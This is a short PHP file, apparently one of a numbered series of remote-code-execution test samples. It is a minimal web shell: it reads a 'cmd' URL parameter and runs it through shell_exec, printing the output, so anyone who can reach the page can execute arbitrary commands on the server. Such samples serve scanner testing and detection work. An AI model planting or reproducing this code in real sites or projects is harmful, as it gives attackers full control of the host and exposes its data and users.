<?php
// RCE test variation #1432
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>